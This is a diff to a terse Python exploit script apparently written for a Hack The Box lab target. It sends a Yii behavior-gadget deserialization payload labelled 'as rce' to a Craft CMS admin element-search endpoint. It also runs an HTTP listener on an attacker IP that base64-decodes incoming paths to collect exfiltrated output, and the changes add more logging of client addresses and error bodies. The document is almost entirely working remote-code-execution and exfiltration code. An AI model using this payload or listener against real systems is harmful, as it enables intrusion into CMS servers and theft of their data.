@@ -3,7 +3,7 @@ from http.server import BaseHTTPRequestHandler as BH,HTTPServer as HS
 B="http://portal.international.htb";L="10.13.37.182";P=9998
 class S(BH):
     def do_GET(s):
-        print("REQ:",s.path,flush=True)
+        print("REQ:",s.client_address[0],s.path,flush=True)
         d=urllib.parse.urlparse(s.path).path[1:]
         d=d.replace("_","/").replace("-","+")
         try:out=base64.b64decode(d+"="*(-len(d)%4)).decode(errors="replace")
@@ -26,6 +26,9 @@ b={"as rce":{"__class":"yii\\behaviors\\AttributeTypecastBehavior","__construct(
 p=json.dumps({"elementType":e,"siteId":1,"search":"","condition":{"class":k,"elementType":e,"fieldLayouts":[b]}}).encode()
 H={"Content-Type":"application/json","Accept":"application/json","X-CSRF-Token":t,"X-Requested-With":"XMLHttpRequest","Referer":B+"/admin"}
 try:r=POST(B+"/admin/actions/element-search/search",p,H);print("HTTP",r.status,flush=True)
-except Exception as e:print("PAYLOAD:",e,flush=True)
+except Exception as e:
+    print("PAYLOAD:",e,flush=True)
+    try:print("BODY:",e.read().decode(errors="replace")[:900],flush=True)
+    except Exception as e2:print("nobody:",e2,flush=True)
 print("listening...",flush=True)
 threading.Event().wait()
